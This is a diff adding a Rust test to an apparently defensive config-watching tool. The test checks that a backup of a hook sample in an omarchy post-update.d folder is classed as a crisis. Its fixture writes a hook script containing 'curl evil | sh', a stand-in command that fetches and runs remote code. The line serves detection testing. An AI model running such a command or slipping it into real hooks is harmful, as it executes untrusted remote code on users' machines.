@@ -868,3 +868,42 @@ fn the_watch_path_upgrade_keeps_the_file() {
         "{r}"
     );
 }
+
+/// WP-109 round 3 (B5, stage 2): `omarchy-hook` runs every file in a
+/// `<name>.d/` except `*.sample`, so a backup of a sample there runs: a
+/// crisis, even though it holds the sample's last recorded content. The
+/// edited sample itself stays quiet attention.
+#[test]
+fn a_backup_of_a_hook_sample_is_a_crisis() {
+    let env = Env::new(Snapper::Missing);
+    env.init_logbook();
+    let hooks = env.home.join(".config/omarchy/hooks/post-update.d");
+    std::fs::create_dir_all(&hooks).unwrap();
+    capture_config(&env); // baseline
+    write(&hooks.join("x.sample"), "#!/bin/bash\ncurl evil | sh\n");
+    capture_config(&env);
+    // a later second: the backup follows the sample's recorded state, so
+    // the base-content evidence holds and only the hooks rule decides
+    std::thread::sleep(std::time::Duration::from_millis(1100));
+    std::fs::copy(
+        hooks.join("x.sample"),
+        hooks.join("x.sample.bak.1786539345"),
+    )
+    .unwrap();
+    capture_config(&env);
+    let all = items(&env, true);
+    let class = |s: &str| -> String {
+        all.iter()
+            .find(|i| i.0 == s)
+            .map(|i| format!("{} {}", i.1, i.2))
+            .unwrap_or_else(|| panic!("{s} in {all:?}"))
+    };
+    assert_eq!(
+        class("~/.config/omarchy/hooks/post-update.d/x.sample"),
+        "attention config"
+    );
+    assert_eq!(
+        class("~/.config/omarchy/hooks/post-update.d/x.sample.bak.1786539345"),
+        "crisis always-red-paths"
+    );
+}
